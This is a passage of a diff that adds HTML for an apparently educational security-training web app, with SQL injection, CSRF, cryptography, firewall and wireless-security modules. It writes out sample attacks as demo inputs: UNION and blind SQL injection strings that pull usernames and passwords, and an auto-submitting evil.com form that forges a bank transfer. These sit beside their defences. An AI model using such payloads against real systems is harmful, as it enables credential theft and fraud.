+          <p style="margin-bottom:1.1rem;font-size:.83rem">UNION appends a second SELECT — returning data from any other
+            table in the same response.</p>
+          <div class="grid2">
+            <div>
+              <div class="fg"><label>Account ID (inject here)</label><input id="unionInput"
+                  value="1 UNION SELECT username,password FROM users --"></div>
+              <button class="btn btn-danger" onclick="unionAttack()"><i data-lucide="zap"
+                  style="width:14px;height:14px"></i> Execute UNION Attack</button>
+            </div>
+            <div class="output" id="unionOut" style="min-height:110px">Results appear here...</div>
+          </div>
+        </div>
+      </div>
+      <div class="tab-panel" id="sqliTab-blind">
+        <div class="card">
+          <h3 style="margin-bottom:.75rem">Blind SQL Injection (Boolean-Based)</h3>
+          <p style="margin-bottom:1.1rem;font-size:.83rem">When no data is returned, attackers infer info from
+            TRUE/FALSE responses — extracting data one character at a time.</p>
+          <div class="grid2">
+            <div>
+              <div class="fg"><label>Blind Boolean Payload</label><input id="blindInput"
+                  value="1' AND SUBSTRING(password,1,1)='a' --"></div>
+              <div style="display:flex;gap:.6rem;flex-wrap:wrap">
+                <button class="btn btn-danger" onclick="blindAtk()"><i data-lucide="zap"
+                    style="width:14px;height:14px"></i> Run Attack</button>
+                <button class="btn btn-ghost" onclick="simBlind()"><i data-lucide="play"
+                    style="width:14px;height:14px"></i> Simulate Exfil</button>
+              </div>
+            </div>
+            <div class="output" id="blindOut" style="min-height:110px">Blind SQLi simulation...</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════ CSRF ════════════════════ -->
+  <div id="page-csrf" class="page">
+    <div class="ph">
+      <div style="display:flex;align-items:center;gap:.75rem">
+        <div class="icon-box ib-danger" style="margin-bottom:0"><i data-lucide="shield-alert"
+            style="width:20px;height:20px"></i></div>
+        <div>
+          <h1>CSRF — Cross-Site Request Forgery</h1>
+          <p>Tricks authenticated users into submitting malicious requests using their active session cookie.</p>
+        </div>
+      </div>
+    </div>
+    <div class="section">
+      <div class="mode-toggle">
+        <button class="mode-btn active attack" id="csrfAtk" onclick="setMode('csrf','attack')"><i data-lucide="zap"
+            style="width:14px;height:14px"></i> Attack Mode — No CSRF Token</button>
+        <button class="mode-btn defend" id="csrfDef" onclick="setMode('csrf','defend')"><i data-lucide="shield-check"
+            style="width:14px;height:14px"></i> Defense Mode — Synchronizer Token</button>
+      </div>
+      <div class="grid2">
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="credit-card"
+              style="width:17px;height:17px;color:var(--teal)"></i> SecureBank Transfer</h3>
+          <div
+            style="display:flex;justify-content:space-between;align-items:center;padding:.7rem .95rem;background:var(--teal-bg);border-radius:8px;margin-bottom:1.1rem;border:1px solid var(--teal-bg2)">
+            <span style="font-size:.85rem;color:var(--text2)">Logged in as <strong
+                style="color:var(--navy)">alice</strong></span>
+            <span style="font-weight:800;color:var(--teal)" id="csrfBal">$10,000</span>
+          </div>
+          <div class="fg"><label>Transfer To</label><input id="csrfTo" value="9999-ATTACKER"></div>
+          <div class="fg"><label>Amount ($)</label><input id="csrfAmt" type="number" value="5000"></div>
+          <div id="csrfTknField" style="display:none">
+            <div class="fg"><label>CSRF Token (auto-generated)</label><input id="csrfTknVal" readonly
+                style="font-family:'Courier New',monospace;font-size:.74rem;color:var(--success)"></div>
+          </div>
+          <div style="display:flex;gap:.7rem;flex-wrap:wrap">
+            <button class="btn btn-primary" onclick="legTransfer()"><i data-lucide="check"
+                style="width:14px;height:14px"></i> Submit Transfer</button>
+            <button class="btn btn-danger" onclick="forgedTransfer()"><i data-lucide="zap"
+                style="width:14px;height:14px"></i> Forge from evil.com</button>
+          </div>
+          <div class="output" id="csrfOut" style="margin-top:1.1rem">Transfer status...</div>
+        </div>
+        <div class="card card-danger">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem;color:var(--danger)"><i
+              data-lucide="globe" style="width:17px;height:17px"></i> Attacker's evil.com</h3>
+          <p style="margin-bottom:.9rem;font-size:.83rem">This auto-submitting form is invisible — it fires using the
+            victim's session cookie.</p>
+          <div class="code"><span class="bad">&lt;!-- evil.com/free-prize.html --&gt;
+              &lt;form action="bank.com/transfer"
+              method="POST" id="f"&gt;
+              &lt;input name="to" value="9999-ATTACKER"&gt;
+              &lt;input name="amount" value="5000"&gt;
+              &lt;/form&gt;
+              &lt;script&gt;f.submit()&lt;/script&gt;</span></div>
+          <div class="alert a-danger" style="margin-top:.7rem"><i data-lucide="alert-triangle"
+              style="width:13px;height:13px" class="ai"></i> Browser auto-sends alice's cookie — bank can't distinguish
+            it!</div>
+          <div id="csrfDefExp" class="alert a-success" style="display:none"><i data-lucide="shield-check"
+              style="width:13px;height:13px" class="ai"></i> CSRF token mismatch — evil.com has no valid token — 403
+            Forbidden.</div>
+        </div>
+      </div>
+      <div class="card" style="margin-top:1.4rem">
+        <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="lock"
+            style="width:17px;height:17px;color:var(--teal)"></i> Defense: Synchronizer Token Pattern</h3>
+        <div class="grid2">
+          <div class="code"><span class="cmt">// SERVER: Generate token per session</span>
+            <span class="str">const tok = crypto.randomBytes(32).toString('hex')
+              session.csrfToken = tok</span>
+            <span class="cmt">// Embed in every form</span>
+            <span class="str">&lt;input type="hidden" name="_csrf" value="&lt;%=tok%&gt;"&gt;</span>
+            <span class="cmt">// Validate on every POST</span>
+            <span class="kw">if</span> (req.body._csrf !== session.csrfToken) {
+            <span class="str">return res.status(403).send('CSRF Blocked')</span>
+            }
+          </div>
+          <div>
+            <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+              Unique per session — attacker cannot guess it</div>
+            <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+              SameSite=Strict cookie also prevents cross-origin sending</div>
+            <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+              Double Submit Cookie pattern as stateless alternative</div>
+            <div class="alert a-info"><i data-lucide="info" style="width:13px;height:13px" class="ai"></i> Set
+              <code>SameSite=Lax</code> on all session cookies
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════ CRYPTO ════════════════════ -->
+  <div id="page-crypto" class="page">
+    <div class="ph">
+      <div style="display:flex;align-items:center;gap:.75rem">
+        <div class="icon-box ib-teal" style="margin-bottom:0"><i data-lucide="key-round"
+            style="width:20px;height:20px"></i></div>
+        <div>
+          <h1>Cryptography</h1>
+          <p>AES-256 encryption, SHA-512 hashing, DES weakness comparison, RSA digital signatures, and PKI/TLS.</p>
+        </div>
+      </div>
+    </div>
+    <div class="section">
+      <div class="tabs-nav">
+        <button class="tab-btn active" onclick="st('crypto','aes')"><i data-lucide="lock"
+            style="width:13px;height:13px"></i> AES-256</button>
+        <button class="tab-btn" onclick="st('crypto','hash')"><i data-lucide="fingerprint"
+            style="width:13px;height:13px"></i> SHA-512</button>
+        <button class="tab-btn" onclick="st('crypto','des')"><i data-lucide="gauge" style="width:13px;height:13px"></i>
+          DES vs AES</button>
+        <button class="tab-btn" onclick="st('crypto','sig')"><i data-lucide="pen-tool"
+            style="width:13px;height:13px"></i> Digital Signatures</button>
+        <button class="tab-btn" onclick="st('crypto','pki')"><i data-lucide="network"
+            style="width:13px;height:13px"></i> PKI / TLS</button>
+      </div>
+      <!-- AES -->
+      <div class="tab-panel active" id="cryptoTab-aes">
+        <div class="grid2">
+          <div class="card">
+            <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="lock"
+                style="width:17px;height:17px;color:var(--teal)"></i> AES-256 Encryption</h3>
+            <div class="fg"><label>Plaintext Message</label><input id="aesPlain"
+                value="Transfer $5000 to Alice — Account #1234"></div>
+            <div class="fg"><label>Secret Key (256-bit hex)</label><input id="aesKey"
+                value="0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+                style="font-family:'Courier New',monospace;font-size:.72rem"></div>
+            <div style="display:flex;gap:.7rem;flex-wrap:wrap">
+              <button class="btn btn-primary" onclick="aesEnc()"><i data-lucide="lock"
+                  style="width:14px;height:14px"></i> Encrypt</button>
+              <button class="btn btn-ghost" onclick="aesDec()"><i data-lucide="unlock"
+                  style="width:14px;height:14px"></i> Decrypt</button>
+            </div>
+          </div>
+          <div class="card">
+            <h3 style="margin-bottom:.9rem">Encryption Flow</h3>
+            <div class="cflow" id="aesFlow">
+              <div class="cnode">Plaintext</div>
+              <div class="carrow"><i data-lucide="arrow-right" style="width:15px;height:15px"></i></div>
+              <div class="cnode" style="background:var(--teal-bg);border-color:var(--teal)">AES-256-CBC</div>
+              <div class="carrow"><i data-lucide="arrow-right" style="width:15px;height:15px"></i></div>
+              <div class="cnode">Ciphertext</div>
+            </div>
+            <div class="output" id="aesOut" style="min-height:90px">Encrypt something to see result...</div>
+          </div>
+        </div>
+        <div class="grid3" style="margin-top:1.4rem">
+          <div class="card card-tl">
+            <div class="icon-box ib-teal"><i data-lucide="key" style="width:20px;height:20px"></i></div>
+            <h3>256-bit Key</h3>
+            <p>2²⁵⁶ keys — brute force infeasible even for nation-states. Heat death of universe timescale.</p>
+          </div>
+          <div class="card card-tl">
+            <div class="icon-box ib-teal"><i data-lucide="layers" style="width:20px;height:20px"></i></div>
+            <h3>128-bit Blocks</h3>
+            <p>Data padded to 128-bit blocks. CBC mode chains blocks with XOR for diffusion of patterns.</p>
+          </div>
+          <div class="card card-tl">
+            <div class="icon-box ib-teal"><i data-lucide="shield" style="width:20px;height:20px"></i></div>
+            <h3>GCM Mode</h3>
+            <p>AES-GCM provides authenticated encryption — confidentiality and integrity in one pass.</p>
+          </div>
+        </div>
+      </div>
+      <!-- Hash -->
+      <div class="tab-panel" id="cryptoTab-hash">
+        <div class="grid2">
+          <div class="card">
+            <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="fingerprint"
+                style="width:17px;height:17px;color:var(--teal)"></i> SHA-512 Password Hashing</h3>
+            <div class="fg"><label>Password</label><input id="sha512In" value="MySecretPassword123"></div>
+            <div class="fg"><label>Salt (unique per user)</label><input id="sha512Salt" value="f3a8b2c1d4e5f6a7"
+                style="font-family:'Courier New',monospace"></div>
+            <div style="display:flex;gap:.7rem;flex-wrap:wrap">
+              <button class="btn btn-primary" onclick="doHash()"><i data-lucide="hash"
+                  style="width:14px;height:14px"></i> Hash Password</button>
+              <button class="btn btn-ghost" onclick="newSalt()"><i data-lucide="shuffle"
+                  style="width:14px;height:14px"></i> New Salt</button>
+            </div>
+          </div>
+          <div class="output" id="sha512Out" style="min-height:160px">Hash result...</div>
+        </div>
+        <div class="grid2" style="margin-top:1.4rem">
+          <div class="card card-danger">
+            <h4 style="color:var(--danger)">Bad Practices ❌</h4>
+            <div class="alert a-danger"><i data-lucide="x-circle" style="width:13px;height:13px" class="ai"></i> Plain
+              text: "admin123" in database</div>
+            <div class="alert a-danger"><i data-lucide="x-circle" style="width:13px;height:13px" class="ai"></i>
+              MD5/SHA-1 without salt → rainbow tables crack instantly</div>
+            <div class="alert a-danger"><i data-lucide="x-circle" style="width:13px;height:13px" class="ai"></i> Same
+              salt for all users → batch cracking</div>
+            <div class="code" style="margin-top:.6rem"><span class="bad">// NEVER do this:
+                db.store(user, password)
+                db.store(user, MD5(password))</span></div>
+          </div>
+          <div class="card card-success">
+            <h4 style="color:var(--success)">Best Practices ✅</h4>
+            <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+              SHA-512 with unique random salt per user</div>
+            <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i> Or
+              bcrypt / Argon2 (purpose-built for passwords)</div>
+            <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+              Compare only hashes — never raw passwords</div>
+            <div class="code" style="margin-top:.6rem"><span class="str">const salt = crypto.randomBytes(32)
+                const hash = SHA512(password + salt)
+                // Store: {salt, hash}</span></div>
+          </div>
+        </div>
+      </div>
+      <!-- DES -->
+      <div class="tab-panel" id="cryptoTab-des">
+        <div class="grid3" style="margin-bottom:1.4rem">
+          <div class="card card-danger">
+            <div class="icon-box ib-danger"><i data-lucide="unlock" style="width:20px;height:20px"></i></div>
+            <h3>DES — Deprecated ❌</h3>
+            <div class="mrow" style="padding:.45rem 0">
+              <div class="mbar" style="background:var(--danger)"></div>
+              <div>
+                <div class="mval" style="font-size:.95rem">56-bit</div>
+                <div class="mdesc">Key Size</div>
+              </div>
+            </div>
+            <div class="mrow" style="padding:.45rem 0">
+              <div class="mbar" style="background:var(--danger)"></div>
+              <div>
+                <div class="mval" style="font-size:.95rem">22 hrs</div>
+                <div class="mdesc">Cracked (1999)</div>
+              </div>
+            </div>
+            <div class="ptrack">
+              <div class="pfill" style="width:10%;background:var(--danger)"></div>
+            </div>
+            <div class="alert a-danger" style="margin-top:.6rem"><i data-lucide="x-circle"
+                style="width:13px;height:13px" class="ai"></i> Never use in new systems</div>
+          </div>
+          <div class="card card-warn">
+            <div class="icon-box ib-warn"><i data-lucide="alert-triangle" style="width:20px;height:20px"></i></div>
+            <h3>3DES — Legacy ⚠</h3>
+            <div class="mrow" style="padding:.45rem 0">
+              <div class="mbar" style="background:var(--warn)"></div>
+              <div>
+                <div class="mval" style="font-size:.95rem">168-bit</div>
+                <div class="mdesc">Key Size</div>
+              </div>
+            </div>
+            <div class="mrow" style="padding:.45rem 0">
+              <div class="mbar" style="background:var(--warn)"></div>
+              <div>
+                <div class="mval" style="font-size:.95rem">2023</div>
+                <div class="mdesc">NIST Deprecated</div>
+              </div>
+            </div>
+            <div class="ptrack">
+              <div class="pfill" style="width:35%;background:var(--warn)"></div>
+            </div>
+            <div class="alert a-warn" style="margin-top:.6rem"><i data-lucide="alert-triangle"
+                style="width:13px;height:13px" class="ai"></i> Legacy banking only — migrate</div>
+          </div>
+          <div class="card card-success">
+            <div class="icon-box ib-teal"><i data-lucide="shield-check" style="width:20px;height:20px"></i></div>
+            <h3>AES-256 — Gold Standard ✅</h3>
+            <div class="mrow" style="padding:.45rem 0">
+              <div class="mbar"></div>
+              <div>
+                <div class="mval" style="font-size:.95rem">256-bit</div>
+                <div class="mdesc">Key Size</div>
+              </div>
+            </div>
+            <div class="mrow" style="padding:.45rem 0">
+              <div class="mbar"></div>
+              <div>
+                <div class="mval" style="font-size:.95rem">10³² yr</div>
+                <div class="mdesc">Brute Force Time</div>
+              </div>
+            </div>
+            <div class="ptrack">
+              <div class="pfill" style="width:98%"></div>
+            </div>
+            <div class="alert a-success" style="margin-top:.6rem"><i data-lucide="check-circle"
+                style="width:13px;height:13px" class="ai"></i> NIST-approved. Use AES-256-GCM</div>
+          </div>
+        </div>
+        <div class="card">
+          <button class="btn btn-primary" onclick="runDes()"><i data-lucide="play" style="width:14px;height:14px"></i>
+            Run Comparison</button>
+          <div class="output" id="desOut" style="margin-top:1rem;min-height:90px">Click to run comparison...</div>
+        </div>
+      </div>
+      <!-- Signatures -->
+      <div class="tab-panel" id="cryptoTab-sig">
+        <div class="grid2">
+          <div class="card">
+            <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="pen-tool"
+                style="width:17px;height:17px;color:var(--teal)"></i> Digital Signatures (RSA Simulation)</h3>
+            <div class="fg"><label>Message to Sign</label><textarea
+                id="sigMsg">Transfer $1000 from Alice to Bob. Timestamp: 2026-05-08</textarea></div>
+            <div style="display:flex;gap:.6rem;flex-wrap:wrap">
+              <button class="btn btn-primary" onclick="signMsg()"><i data-lucide="pen-line"
+                  style="width:14px;height:14px"></i> Sign</button>
+              <button class="btn btn-success" onclick="verifyMsg()"><i data-lucide="check-circle-2"
+                  style="width:14px;height:14px"></i> Verify</button>
+              <button class="btn btn-danger" onclick="tamperMsg()"><i data-lucide="zap"
+                  style="width:14px;height:14px"></i> Tamper</button>
+            </div>
+          </div>
+          <div class="output" id="sigOut" style="min-height:190px">Sign a message to see the digital signature...</div>
+        </div>
+        <div class="grid2" style="margin-top:1.4rem">
+          <div class="card">
+            <h4>How It Works</h4>
+            <div class="code"><span class="cmt">// SENDER (Alice) — private key</span>
+              <span class="str">const hash = SHA256(message)
+                const sig = RSA_SIGN(hash, privateKey)</span>
+              <span class="cmt">// Send: {message, signature}</span>
+
+              <span class="cmt">// RECEIVER (Bob) — public key</span>
+              <span class="str">const h1 = SHA256(receivedMessage)
+                const h2 = RSA_VERIFY(sig, publicKey)</span>
+              <span class="kw">if</span> (h1 === h2) <span class="str">→ ✅ AUTHENTIC</span>
+              <span class="kw">else</span> <span class="bad">→ ❌ TAMPERED</span>
+            </div>
+          </div>
+          <div class="card">
+            <h4>Properties Guaranteed</h4>
+            <div class="alert a-success"><i data-lucide="user-check" style="width:13px;height:13px" class="ai"></i>
+              <strong>Authentication</strong> — only Alice has the private key
+            </div>
+            <div class="alert a-success"><i data-lucide="shield" style="width:13px;height:13px" class="ai"></i>
+              <strong>Integrity</strong> — any change invalidates the signature
+            </div>
+            <div class="alert a-success"><i data-lucide="file-check" style="width:13px;height:13px" class="ai"></i>
+              <strong>Non-repudiation</strong> — Alice cannot deny signing
+            </div>
+            <div class="alert a-info"><i data-lucide="info" style="width:13px;height:13px" class="ai"></i> Used in TLS,
+              code signing, S/MIME, blockchain</div>
+          </div>
+        </div>
+      </div>
+      <!-- PKI -->
+      <div class="tab-panel" id="cryptoTab-pki">
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.4rem"><i data-lucide="network"
+              style="width:17px;height:17px;color:var(--teal)"></i> PKI Certificate Chain & TLS Handshake</h3>
+          <div class="grid2">
+            <div>
+              <h4>Certificate Chain</h4>
+              <div style="display:flex;flex-direction:column;gap:.55rem;margin-top:.9rem">
+                <div
+                  style="background:var(--warn-bg);border:1.5px solid rgba(217,119,6,.2);border-radius:10px;padding:.85rem 1rem;border-left:4px solid var(--warn)">
+                  <div
+                    style="font-size:.72rem;color:var(--warn);font-weight:700;text-transform:uppercase;letter-spacing:.5px">
+                    Root CA (Self-signed)</div>
+                  <div style="font-weight:600;color:var(--navy);margin:.18rem 0;font-size:.9rem">DigiCert Global Root G2
+                  </div>
+                  <div style="font-size:.72rem;color:var(--text3);font-family:'Courier New',monospace">Exp: 2038-01-15 |
+                    RSA 4096</div>
+                </div>
+                <div
+                  style="text-align:center;color:var(--teal);font-size:.75rem;display:flex;align-items:center;justify-content:center;gap:.3rem">
+                  <i data-lucide="arrow-down" style="width:15px;height:15px"></i> signs
+                </div>
+                <div
+                  style="background:#f5f3ff;border:1.5px solid rgba(124,58,237,.2);border-radius:10px;padding:.85rem 1rem;border-left:4px solid #7c3aed">
+                  <div
+                    style="font-size:.72rem;color:#7c3aed;font-weight:700;text-transform:uppercase;letter-spacing:.5px">
+                    Intermediate CA</div>
+                  <div style="font-weight:600;color:var(--navy);margin:.18rem 0;font-size:.9rem">DigiCert TLS RSA SHA256
+                    2020</div>
+                  <div style="font-size:.72rem;color:var(--text3);font-family:'Courier New',monospace">Exp: 2031-04-13 |
+                    RSA 2048</div>
+                </div>
+                <div
+                  style="text-align:center;color:var(--teal);font-size:.75rem;display:flex;align-items:center;justify-content:center;gap:.3rem">
+                  <i data-lucide="arrow-down" style="width:15px;height:15px"></i> signs
+                </div>
+                <div
+                  style="background:var(--success-bg);border:1.5px solid rgba(5,150,105,.2);border-radius:10px;padding:.85rem 1rem;border-left:4px solid var(--success)">
+                  <div
+                    style="font-size:.72rem;color:var(--success);font-weight:700;text-transform:uppercase;letter-spacing:.5px">
+                    End-Entity Certificate</div>
+                  <div style="font-weight:600;color:var(--navy);margin:.18rem 0;font-size:.9rem">*.securebank.com</div>
+                  <div style="font-size:.72rem;color:var(--text3);font-family:'Courier New',monospace">Exp: 2027-05-01 |
+                    RSA 2048</div>
+                </div>
+              </div>
+            </div>
+            <div>
+              <h4>TLS 1.3 Handshake</h4>
+              <div class="code" style="margin-bottom:1rem"><span class="cmt">1. Client Hello → TLS 1.3, cipher
+                  suites</span>
+                <span class="cmt">2. Server Hello → chosen cipher, certificate</span>
+                <span class="cmt">3. Client verifies chain to trusted Root CA</span>
+                <span class="cmt">4. Key Exchange (ECDHE) → shared secret</span>
+                <span class="cmt">5. Session keys derived (AES-256-GCM)</span>
+                <span class="cmt">6. All traffic encrypted + authenticated</span>
+              </div>
+              <div class="alert a-success"><i data-lucide="shield-check" style="width:13px;height:13px" class="ai"></i>
+                Forward secrecy — past sessions safe if key leaked</div>
+              <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+                Certificate pinning prevents MITM attacks</div>
+              <div class="alert a-info"><i data-lucide="info" style="width:13px;height:13px" class="ai"></i> HSTS:
+                <code>Strict-Transport-Security: max-age=31536000</code>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════ FIREWALL ════════════════════ -->
+  <div id="page-firewall" class="page">
+    <div class="ph">
+      <div style="display:flex;align-items:center;gap:.75rem">
+        <div class="icon-box ib-teal" style="margin-bottom:0"><i data-lucide="server"
+            style="width:20px;height:20px"></i></div>
+        <div>
+          <h1>Firewall Rules & Network Security</h1>
+          <p>Define packet filtering rules by IP, port, and protocol. Simulate traffic and analyze wireless security
+            standards.</p>
+        </div>
+      </div>
+    </div>
+    <div class="section">
+      <div class="grid2">
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="plus-circle"
+              style="width:17px;height:17px;color:var(--teal)"></i> Add Firewall Rule</h3>
+          <div class="grid2" style="gap:.7rem">
+            <div class="fg"><label>Source IP</label><input id="fwIP" placeholder="192.168.1.0 or ANY"></div>
+            <div class="fg"><label>Port</label><input id="fwPort" placeholder="443 or ANY"></div>
+            <div class="fg"><label>Protocol</label><select id="fwProto">
+                <option>TCP</option>
+                <option>UDP</option>
+                <option>ICMP</option>
+                <option>ANY</option>
+              </select></div>
+            <div class="fg"><label>Action</label><select id="fwAct">
+                <option value="ALLOW">ALLOW</option>
+                <option value="DENY">DENY</option>
+                <option value="LOG">LOG & ALLOW</option>
+              </select></div>
+          </div>
+          <button class="btn btn-primary" onclick="addRule()"><i data-lucide="plus" style="width:14px;height:14px"></i>
+            Add Rule</button>
+        </div>
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="send"
+              style="width:17px;height:17px;color:var(--teal)"></i> Simulate Packet</h3>
+          <div class="grid2" style="gap:.7rem">
+            <div class="fg"><label>Source IP</label><input id="simIP" value="192.168.1.100"></div>
+            <div class="fg"><label>Port</label><input id="simPort" value="443"></div>
+            <div class="fg"><label>Protocol</label><select id="simProto">
+                <option>TCP</option>
+                <option>UDP</option>
+                <option>ICMP</option>
+              </select></div>
+            <div class="fg" style="display:flex;align-items:flex-end"><button class="btn btn-outline"
+                style="width:100%;margin-top:.1rem" onclick="simPkt()"><i data-lucide="play"
+                  style="width:14px;height:14px"></i> Send Packet</button></div>
+          </div>
+          <div class="output" id="fwSimOut" style="margin-top:.6rem;min-height:70px">Results...</div>
+        </div>
+      </div>
+      <div class="card" style="margin-top:1.4rem">
+        <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem"><i data-lucide="list"
+            style="width:17px;height:17px;color:var(--teal)"></i> Active Firewall Rules</h3>
+        <div style="overflow-x:auto">
+          <table class="dt">
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Source IP</th>
+                <th>Port</th>
+                <th>Protocol</th>
+                <th>Action</th>
+                <th>Hits</th>
+                <th>Remove</th>
+              </tr>
+            </thead>
+            <tbody id="fwBody"></tbody>
+          </table>
+        </div>
+      </div>
+      <div style="margin-top:1.6rem">
+        <div class="section-tag" style="margin-bottom:1rem"><i data-lucide="wifi" style="width:12px;height:12px"></i>
+          Wireless Security</div>
+        <div class="grid3">
+          <div class="card card-danger">
+            <div class="icon-box ib-danger"><i data-lucide="wifi-off" style="width:20px;height:20px"></i></div>
+            <h3>Open Network ❌</h3>
+            <p style="margin-bottom:.9rem">No encryption, no auth. Anyone in range intercepts all traffic in plain text.
+            </p>
+            <div class="alert a-danger"><i data-lucide="eye" style="width:13px;height:13px" class="ai"></i> Wireshark
+              captures all data</div>
+            <div class="alert a-danger"><i data-lucide="user-x" style="width:13px;height:13px" class="ai"></i> ARP
+              poisoning & session hijacking trivial</div>
+          </div>
+          <div class="card card-warn">
+            <div class="icon-box ib-warn"><i data-lucide="wifi" style="width:20px;height:20px"></i></div>
+            <h3>WEP / WPA ⚠</h3>
+            <p style="margin-bottom:.9rem">WEP broken in minutes via IV collision. WPA-TKIP has chopchop vulnerability.
+            </p>
+            <div class="alert a-warn"><i data-lucide="clock" style="width:13px;height:13px" class="ai"></i> WEP cracked
+              &lt; 5 min with aircrack-ng</div>
+            <div class="alert a-success"><i data-lucide="check-circle" style="width:13px;height:13px" class="ai"></i>
+              Better than open — migrate to WPA3</div>
+          </div>
+          <div class="card card-success">
+            <div class="icon-box ib-teal"><i data-lucide="shield-check" style="width:20px;height:20px"></i></div>
+            <h3>WPA2 / WPA3 ✅</h3>
+            <p style="margin-bottom:.9rem">WPA2 uses AES-CCMP. WPA3 uses SAE — resistant to offline dictionary attacks.
+            </p>
+            <div class="alert a-success"><i data-lucide="lock" style="width:13px;height:13px" class="ai"></i> WPA3-SAE:
+              forward secrecy per session</div>
+            <div class="alert a-success"><i data-lucide="users" style="width:13px;height:13px" class="ai"></i>
+              WPA3-Enterprise: per-user 802.1X auth</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════ DASHBOARD ════════════════════ -->
+  <div id="page-dashboard" class="page">
+    <div class="ph">
+      <div style="display:flex;align-items:center;gap:.75rem">
+        <div class="icon-box ib-teal" style="margin-bottom:0"><i data-lucide="layout-dashboard"
+            style="width:20px;height:20px"></i></div>
+        <div>
+          <h1>Security Dashboard</h1>
+          <p>Real-time overview of all security modules, attack simulations, defense mechanisms, and topic coverage.</p>
+        </div>
+      </div>
+    </div>
+    <div class="section">
+      <div class="grid4" style="margin-bottom:2rem">
+        <div class="stat-card">
+          <div class="stat-icon"><i data-lucide="zap" style="width:20px;height:20px"></i></div>
+          <div class="stat-val" id="statAtk">0</div>
+          <div class="stat-lbl">Attacks Simulated</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon"><i data-lucide="shield-check" style="width:20px;height:20px"></i></div>
+          <div class="stat-val" id="statBlk">0</div>
+          <div class="stat-lbl">Attacks Blocked</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon"><i data-lucide="book-open" style="width:20px;height:20px"></i></div>
+          <div class="stat-val">12</div>
+          <div class="stat-lbl">Topics Covered</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-icon"><i data-lucide="activity" style="width:20px;height:20px"></i></div>
+          <div class="stat-val" id="statMode" style="font-size:1.2rem">SECURE</div>
+          <div class="stat-lbl">Current Mode</div>
+        </div>
+      </div>
+      <div class="grid2">
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:1.1rem"><i data-lucide="bar-chart-2"
+              style="width:17px;height:17px;color:var(--teal)"></i> Topic Coverage</h3>
+          <div id="topicProg"></div>
+        </div>
+        <div class="card">
+          <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem"><i data-lucide="terminal"
+              style="width:17px;height:17px;color:var(--teal)"></i> Attack Log</h3>
+          <div class="output" id="atkLog" style="min-height:180px;max-height:260px">No events yet. Interact with modules
+            to populate log...</div>
+        </div>
+      </div>
+      <!-- Malware -->
+      <div class="card" style="margin-top:1.4rem">
+        <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem"><i data-lucide="scan-search"
+            style="width:17px;height:17px;color:var(--teal)"></i> Malware File Scanner (ML-Inspired)</h3>
+        <p style="margin-bottom:1.1rem">Analyze files for suspicious patterns — entropy analysis, known bad hashes,
+          heuristic classification (Random Forest simulation).</p>
+        <div
+          style="border:2px dashed var(--border);border-radius:12px;padding:2.2rem;text-align:center;background:var(--bg);margin-bottom:.9rem;transition:border-color .2s"
+          onmouseenter="this.style.borderColor='var(--teal)'" onmouseleave="this.style.borderColor='var(--border)'">
+          <input type="file" id="mwFile" onchange="scanFile()" style="display:none">
+          <i data-lucide="upload-cloud" style="width:34px;height:34px;color:var(--teal);margin-bottom:.65rem"></i><br>
+          <button class="btn btn-outline" onclick="document.getElementById('mwFile').click()"><i
+              data-lucide="folder-open" style="width:14px;height:14px"></i> Upload File for Analysis</button>
+          <p style="margin-top:.4rem;font-size:.76rem">.exe · .pdf · .js · .txt · .zip</p>
+        </div>
+        <div class="output" id="mwOut" style="min-height:70px">Waiting for file upload...</div>
+      </div>
+      <!-- Headers -->
+      <div class="card" style="margin-top:1.4rem">
+        <h3 style="display:flex;align-items:center;gap:.45rem;margin-bottom:.9rem"><i data-lucide="monitor-check"
+            style="width:17px;height:17px;color:var(--teal)"></i> Security Headers Audit</h3>
+        <div style="overflow-x:auto">
+          <table class="dt">
+            <thead>
+              <tr>
+                <th>Header</th>
+                <th>Value</th>
+                <th>Status</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>Content-Security-Policy</td>
+                <td style="font-family:'Courier New',monospace;font-size:.73rem">default-src 'self'; script-src 'self'
+                  'nonce-{random}'</td>
+                <td><span class="badge b-allow"><i data-lucide="check" style="width:10px;height:10px"></i> SET</span>
+                </td>
+              </tr>
+              <tr>
+                <td>X-Frame-Options</td>
+                <td style="font-family:'Courier New',monospace;font-size:.73rem">DENY</td>
